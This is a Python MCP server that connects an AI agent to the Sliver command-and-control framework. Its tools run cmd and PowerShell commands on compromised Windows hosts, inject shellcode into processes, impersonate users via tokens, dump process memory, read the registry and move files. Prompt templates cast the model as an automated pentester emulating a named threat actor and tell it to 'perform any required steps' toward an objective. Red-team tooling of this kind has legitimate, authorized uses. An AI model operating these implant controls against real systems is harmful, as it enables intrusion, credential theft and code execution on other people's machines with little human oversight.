from typing import Any, List
from mcp.server.fastmcp import FastMCP
from sliver import SliverClientConfig, SliverClient
import os
import asyncio
import base64
import sys
import argparse

# Initialize FastMCP server
mcp = FastMCP("sliverc2_mcp")

# Variables
sliver_client = None






def format_sliver_beacon(raw_beacon: str) -> str:
        """Returns a formatted Sliver session string
        
        Args:
            raw_session: Raw Session object
        """

        output = ""
        
        output += f"Beacon ID: %s\n" % raw_beacon.ID
        output += f"Implant Name: %s\n" % raw_beacon.Name
        output += f"Hostname: %s\n" % raw_beacon.Hostname
        output += f"UUID: %s\n" % raw_beacon.UUID
        output += f"Username: %s\n" % raw_beacon.Username
        output += f"GID: %s\n" % raw_beacon.GID
        output += f"UID: %s\n" % raw_beacon.UID
        output += f"OS: %s\n" % raw_beacon.OS
        output += f"Transport: %s\n" % raw_beacon.Transport
        output += f"PID: %s\n" % raw_beacon.PID
        output += f"Filename: %s\n" % raw_beacon.Filename
        output += f"LastCheckin: %s\n" % raw_beacon.LastCheckin
        output += f"ActiveC2: %s\n" % raw_beacon.ActiveC2

        return output


def format_sliver_session(raw_session: str) -> str:
        """Returns a formatted Sliver session string
        
        Args:
            raw_session: Raw Session object
        """

        output = ""
        
        output += f"Session ID: %s\n" % raw_session.ID
        output += f"Implant Name: %s\n" % raw_session.Name
        output += f"Hostname: %s\n" % raw_session.Hostname
        output += f"UUID: %s\n" % raw_session.UUID
        output += f"Username: %s\n" % raw_session.Username
        output += f"GID: %s\n" % raw_session.GID
        output += f"UID: %s\n" % raw_session.UID
        output += f"OS: %s\n" % raw_session.OS
        output += f"Transport: %s\n" % raw_session.Transport
        output += f"PID: %s\n" % raw_session.PID
        output += f"Filename: %s\n" % raw_session.Filename
        output += f"LastCheckin: %s\n" % raw_session.LastCheckin
        output += f"ActiveC2: %s\n" % raw_session.ActiveC2

        return output





@mcp.prompt()
def start_pentest_apt(threat_actor: str, objective: str) -> str:
    return f"You are an automated pentester, tasked with emulating a specific threat actor. The threat actor is {threat_actor}. Your objective is: {objective}. Perform any required steps to meet the objective, using only techniques documented by the threat actor."


@mcp.prompt()
def start_pentest_mitre(techniques: list[str], objective: str) -> str:
    return f"You are an automated pentester, tasked with emulating an attack using only specific MITRE Att&CK techniques. The techniques I want u to use are {techniques}. Your objective is: {objective}. Perform any required steps to meet the objective, using only given techniques."





###############
# 
# SLIVER CLIENT 
# 
###############

@mcp.tool()
async def list_sessions() -> List[str]:
    """
    Return a formatted list of active Sliver sessions.

    Returns:
        str: A formatted string representing all active sessions.
    """
    try:
        sessions = await sliver_client.sessions()  # List of ProtoBuf Session objects

        if not sessions:
            return "---\nNo active sessions.\n---"

        # output = list()
        # for session in sessions:
        #     output.append(format_sliver_session(session))

        return sessions
    except Exception as e:
        return f"Failed to list sessions: {e}"


@mcp.tool()
async def list_beacons() -> List[str]:
    """
    Return a formatted list of active Sliver beacons.

    Returns:
        str: A formatted string representing all active beacons.
    """
    try:
        beacons = await sliver_client.beacons()  # List of ProtoBuf Beacons objects

        if not beacons:
            return "---\nNo active beacons.\n---"

        # output = list()
        # for beacon in beacons:
        #     output.append(format_sliver_beacon(beacon))

        return beacons
    except Exception as e:
        return f"Failed to list beacons: {e}"


###############
# 
# SLIVER BEACON 
# 
###############



################
# 
# SLIVER SESSION 
# 
################

@mcp.tool()
async def change_directory(session_id: str, remote_path: str) -> Any:
    """
    Change the current working directory of the implant to the specified remote path.

    Args:
        session_id (str): ID of the active Sliver session.
        remote_path (str): The target directory path on the remote system.

    Returns:
        Any: A Pwd-like object containing the updated working directory info.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        pwd_info = await session.cd(remote_path)
        print(f"Directory changed to: {pwd_info.Path}")
        return pwd_info
    except Exception as e:
        return f"Failed to change directory for session '{session_id}' to '{remote_path}': {e}"


@mcp.tool()
async def list_files(session_id: str, path: str) -> List[Any]:
    """
    List files at a specified path on the target system using the given Sliver session ID.

    Args:
        session_id (str): The ID of the active Sliver session.
        path (str): The remote path to list files from.

    Returns:
        List[Any]: A list of file-like objects representing files at the specified path.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        ls_response = await session.ls(path)
        return list(ls_response.Files)
    except Exception as e:
        return f"Error listing files for session '{session_id}' at '{path}': {e}"
        


@mcp.tool()
async def upload_file(session_id: str, file_name: str, remote_path: str, content: str) -> str:
    """
    Upload a file to the remote target using the specified Sliver session.

    Args:
        session_id (str): ID of the session to execute the upload on.
        file_name (str): Name to give the file on the target.
        remote_path (str): Full directory path where the file will be placed.
        content (str): Base64-encoded contents of the file.

    Returns:
        str: Upload status message, wrapped in separators.
    """
    try:
        decoded_contents = base64.b64decode(content)
        full_remote_path = os.path.join(remote_path, file_name)
        session = await sliver_client.interact_session(session_id)
        status = await session.upload(full_remote_path, decoded_contents)

        if status:
            return "File uploaded successfully"
        else:
            return "Error uploading file"
    except Exception as e:
        return f"Exception during file upload: {e}"


@mcp.tool()
async def download_file(session_id: str, remote_path: str) -> str:
    """
    Download a file from the target system using the given Sliver session ID.

    Args:
        session_id (str): ID of the session to download the file from.
        remote_path (str): Full path to the file on the target to be downloaded.

    Returns:
        str: Result of the download operation, wrapped in separators.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        output = await session.download(remote_path)
        return output
    except Exception as e:
        return f"Failed to download file: {e}"


@mcp.tool()
async def run_cmd_command(session_id: str, command: str) -> str:
    """
    Execute a command on the target using the default cmd.exe interpreter.

    Args:
        session_id (str): ID of the session to execute the command on.
        command (str): The command to execute using cmd.exe.

    Returns:
        str: Output of the command, wrapped in separators.
    """
    exec_full_path = r'C:\Windows\System32\cmd.exe'

    try:
        session = await sliver_client.interact_session(session_id)
        print(f'Executing command: {command}')
        output = await session.execute(exec_full_path, ['/c', command], True)
        return output
    except Exception as e:
        return f"Failed to execute CMD command: {e}"


@mcp.tool()
async def run_ps_command(session_id: str, command: str) -> str:
    """
    Execute a PowerShell command on the target using the default PowerShell interpreter.

    Args:
        session_id (str): ID of the session to execute the command on.
        command (str): PowerShell command to execute using powershell.exe.

    Returns:
        str: The command output, wrapped in separators.
    """
    exec_full_path = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

    try:
        session = await sliver_client.interact_session(session_id)
        print(f'Executing command: {command}')
        output = await session.execute(exec_full_path, [command], True)
        return output
    except Exception as e:
        return f"Failed to execute PowerShell command: {e}"



@mcp.tool()
async def run_shellcode(session_id: str, shellcode_data: bytes, rwx: bool, pid: int, encoder: str) -> str:
    """
    Execute shellcode in memory on the target using the specified Sliver session.

    Args:
        session_id (str): The ID of the session to execute the command on.
        shellcode_data (bytes): The raw shellcode buffer to execute.
        rwx (bool): Whether to allocate RWX (read-write-execute) memory pages.
        pid (int): The target process ID to inject the shellcode into.
        encoder (str): The encoder to use (e.g., '', 'gzip').

    Returns:
        str: Confirmation message indicating shellcode execution.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        await session.execute_shellcode(shellcode_data, rwx, pid, encoder)
        return f"---\nExecuted shellcode\n---"
    except Exception as e:
        return f"---\n[!] Failed to execute shellcode: {e}\n---"



@mcp.tool()
async def list_processes(session_id: str) -> Any:
    """
    Retrieve the list of running processes on the target system using the specified Sliver session.

    Args:
        session_id (str): The ID of the active Sliver session.

    Returns:
        Any: The raw output from the `ps` command on the target.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        output = await session.ps()
        return output
    except Exception as e:
        return f"Failed to list processes for session '{session_id}': {e}"



@mcp.tool()
async def impersonate(session_id: str, username: str) -> str:
    """
    Impersonate a user using tokens (Windows only) on the target system.

    Args:
        session_id (str): The ID of the active Sliver session.
        username (str): The username to impersonate.
    
    Returns:
        str: The output from the impersonation attempt, formatted with separators.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        output = await session.impersonate(username)
        return output
    except Exception as e:
        return f"Failed to impersonate {username}: {e}"



@mcp.tool()
async def run_as(session_id: str, username: str, process_name: str, args: str) -> str:
    """
    Run a command as another user on the target system using the specified Sliver session.

    Args:
        session_id (str): The ID of the active Sliver session.
        username (str): The username to impersonate.
        process_name (str): The name of the process to run.
        args (str): Command-line arguments for the process.

    Returns:
        str: Output from the executed process.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        output = await session.run_as(username, process_name, args)
        return output
    except Exception as e:
        return f"Failed to run process as {username}: {e}"


# @mcp.tool()
# async def create_registry_key(session_id: str, hive: str, reg_path: str, hostname: str):
#     """
#     Create a registry key on the target system.

#     Args:
#         session_id (str): The ID of the active Sliver session.
#         hive (str): The registry hive (e.g., "HKCU", "HKLM").
#         reg_path (str): The registry path where the key will be created.
#         hostname (str): The hostname of the target system.
#     """
#     session = await sliver_client.interact_session(session_id)
#     try:
#         result = await session.registry_create_key(hive, reg_path, hostname)
#         print(f"Registry key created: {result}")
#     except Exception as e:
#         print(f"Failed to create registry key: {e}")


@mcp.tool()
async def read_registry_value(session_id: str, hive: str, reg_path: str, key: str, hostname: str):
    """
    Read a registry value from the target system.

    Args:
        session_id (str): The ID of the active Sliver session.
        hive (str): The registry hive (e.g., "HKCU", "HKLM").
        reg_path (str): The registry path containing the key.
        key (str): The name of the registry value to read.
        hostname (str): The hostname of the target system.
    """
    session = await sliver_client.interact_session(session_id)
    try:
        result = await session.registry_read(hive, reg_path, key, hostname)
        print(f"Registry value read: {result}")
        return result
    except Exception as e:
        print(f"Failed to read registry value: {e}")


# async def write_registry_value(session_id: str, hive: str, reg_path: str, key: str, hostname: str, string_value: str = "", byte_value: bytes = b"", dword_value: int = 0, qword_value: int = 0, reg_type: RegistryType = RegistryType.REG_SZ):
#     """
#     Write a value to a registry key on the target system.

#     Args:
#         session_id (str): The ID of the active Sliver session.
#         hive (str): The registry hive (e.g., "HKCU", "HKLM").
#         reg_path (str): The registry path containing the key.
#         key (str): The name of the registry value to write.
#         hostname (str): The hostname of the target system.
#         string_value (str, optional): The string value to write. Defaults to "".
#         byte_value (bytes, optional): The byte value to write. Defaults to b"".
#         dword_value (int, optional): The DWORD value to write. Defaults to 0.
#         qword_value (int, optional): The QWORD value to write. Defaults to 0.
#         reg_type (RegistryType): Type of registry key to write.
#     """
#     session = await sliver_client.interact_session(session_id)
#     try:
#         result = await session.registry_write(hive, reg_path, key, hostname, string_value=string_value, byte_value=byte_value, dword_value=dword_value, qword_value=qword_value)
#         print(f"Registry value written: {result}")
#     except Exception as e:
#         print(f"Failed to write registry value: {e}")


@mcp.tool()
async def dump_process_memory(session_id: str, pid: int) -> Any:
    """
    Dump the memory of a remote process using the given Sliver session and PID.

    Args:
        session_id (str): ID of the active Sliver session.
        pid (int): Process ID of the target process to dump.

    Returns:
        Any: The ProcessDump protobuf object containing the dump metadata.
    """
    try:
        session = await sliver_client.interact_session(session_id)
        result = await session.process_dump(pid)
        print(f"Process memory dump completed for PID {pid}")
        return result
    except Exception as e:
        return f"Failed to dump process memory for PID {pid}: {e}"




async def main():
    ''' Async sliver client connect '''
    await sliver_client.connect()

    ''' Async mcp server start '''
    await mcp.run_stdio_async()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MCP for Sliver")
    parser.add_argument(
        "--operator-config-file", required=True, type=str, help="Path to the Sliver Client Operator config file to connect to the Sliver C2 Server"
    )

    args = parser.parse_args()
    config = SliverClientConfig.parse_config_file(args.operator_config_file)
    sliver_client = SliverClient(config)

    asyncio.run(main())